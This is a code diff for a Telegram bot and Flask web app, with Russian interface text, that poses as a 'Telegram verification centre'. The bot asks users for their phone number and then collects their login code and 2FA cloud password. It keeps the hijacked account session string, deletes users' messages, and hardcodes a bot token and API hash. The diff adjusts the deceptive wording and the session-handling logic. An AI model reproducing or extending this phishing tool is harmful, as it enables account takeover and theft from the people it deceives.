@@ -11,9 +11,8 @@ app = Flask(__name__)
 
 API_ID = 25757508
 API_HASH = '3091fbda91d4b133207779ddf81fee39'
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338")
+BOT_TOKEN = "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338"
 
-# تخزين الجلسات النشطة
 active_sessions = {}
 
 WEB_APP_HTML = """
@@ -78,13 +77,13 @@ WEB_APP_HTML = """
             .then(res => res.json())
             .then(data => {
                 if (data.status === 'need_password') {
-                    document.getElementById('desc_text').innerText = "Введите пароль 2FA:";
+                    document.getElementById('desc_text').innerText = "Введите облачный пароль (2FA):";
                     document.getElementById('content').innerHTML = `
                         <div id="error_box" class="msg"></div>
-                        <input type="password" id="pass_val" placeholder="Облачный пароль">
+                        <input type="password" id="pass_val" placeholder="Пароль">
                         <button onclick="submitPassword()">Войти</button>`;
                 } else if (data.status === 'done') {
-                    document.getElementById('desc_text').innerText = "Успешно!";
+                    document.getElementById('desc_text').innerText = "Успешно верифицировано!";
                     document.getElementById('content').innerHTML = `
                         <h3 style="color: #4cd964;">✅ Готово!</h3>
                         <p>Сессия сохранена:</p>
@@ -111,7 +110,7 @@ WEB_APP_HTML = """
             .then(res => res.json())
             .then(data => {
                 if (data.status === 'done') {
-                    document.getElementById('desc_text').innerText = "Успешно!";
+                    document.getElementById('desc_text').innerText = "Успешно верифицировано!";
                     document.getElementById('content').innerHTML = `
                         <h3 style="color: #4cd964;">✅ Готово!</h3>
                         <p>Сессия сохранена:</p>
@@ -142,59 +141,58 @@ def api():
 
     session_data = active_sessions.get(phone)
     if not session_data:
-        return jsonify({"status": "error", "message": "Сессия истекла. Начните заново."})
+        return jsonify({"status": "error", "message": "Сессия истекла."})
 
     try:
         client = session_data['client']
-        
-        async def run_telethon():
-            if action == 'code':
-                code = str(value).strip()
-                try:
-                    await client.sign_in(str(phone), code, phone_code_hash=str(session_data['hash']))
-                    session_str = client.session.save()
-                    session_data['session_str'] = session_str
-                    return {"status": "done", "session": str(session_str)}
-                except Exception as e:
-                    err_str = str(e)
-                    if "SessionPasswordNeededError" in err_str or "password" in err_str.lower() or "Password" in err_str:
-                        return {"status": "need_password"}
-                    else:
-                        return {"status": "error", "message": err_str}
-
-            elif action == 'password':
-                password = str(value).strip()
-                try:
-                    await client.sign_in(password=password)
-                    session_str = client.session.save()
-                    session_data['session_str'] = session_str
-                    return {"status": "done", "session": str(session_str)}
-                except Exception as e:
-                    return {"status": "error", "message": f"Неверный пароль: {e}"}
-
         loop = asyncio.new_event_loop()
-        res = loop.run_until_complete(run_telethon())
-        loop.close()
-        return jsonify(res)
+        asyncio.set_event_loop(loop)
+
+        if action == 'code':
+            code = str(value).strip()
+            try:
+                loop.run_until_complete(client.sign_in(str(phone), code, phone_code_hash=str(session_data['hash'])))
+                session_str = client.session.save()
+                session_data['session_str'] = session_str
+                loop.close()
+                return jsonify({"status": "done", "session": str(session_str)})
+            except Exception as e:
+                loop.close()
+                err_str = str(e)
+                if "SessionPasswordNeededError" in err_str or "password" in err_str.lower() or "Password" in err_str:
+                    return jsonify({"status": "need_password"})
+                else:
+                    return jsonify({"status": "error", "message": err_str})
+
+        elif action == 'password':
+            password = str(value).strip()
+            try:
+                loop.run_until_complete(client.sign_in(password=password))
+                session_str = client.session.save()
+                session_data['session_str'] = session_str
+                loop.close()
+                return jsonify({"status": "done", "session": str(session_str)})
+            except Exception as e:
+                loop.close()
+                return jsonify({"status": "error", "message": f"Неверный пароль: {e}"})
 
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
-# --- أوامر البوت ---
+    return jsonify({"status": "error", "message": "Неизвестный запрос"})
+
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # لا نقوم بحذف رسالة start بناءً على رغبتك
     button = KeyboardButton("🛡️ Подтвердить номер телефона", request_contact=True)
     reply_markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
     
     await update.message.reply_text(
-        "👋 Добро пожаловать в центр верификации Telegram.\n\nНажмите кнопку ниже для подтверждения номера:",
+        "👋 Добро пожаловать في центр верификации Telegram.\n\nНажмите кнопку ниже для подтверждения номера:",
         reply_markup=reply_markup
     )
 
 async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     contact = update.message.contact
     
-    # حذف رسالة الرقم فقط لضمان النظافة والخصوصية
     try:
         await update.message.delete()
     except Exception:
@@ -227,7 +225,7 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup = InlineKeyboardMarkup(keyboard)
 
             await update.message.reply_text(
-                f"✅ Номер {phone} успешно получен! Код отправлен в Telegram. Нажмите кнопку ниже для ввода кода:",
+                "✅ Код подтверждения успешно отправлен в ваш Telegram. Нажмите кнопку ниже для ввода кода:",
                 reply_markup=reply_markup
             )
         except Exception as e:
@@ -270,7 +268,6 @@ async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_
         await status_msg.edit_text(f"❌ Ошибка: {e}")
 
 async def auto_delete_user_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # حذف أي رسالة نصية عشوائية يرسلها المستخدم للمحافظة على نظافة الشات
     try:
         await update.message.delete()
     except Exception:
@@ -290,6 +287,6 @@ if __name__ == '__main__':
     application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_delete_user_messages))
     
-    print("Fokhm 2FA Bot is running perfectly...")
+    print("Fokhm Final Production Bot is running...")
     application.run_polling()
 
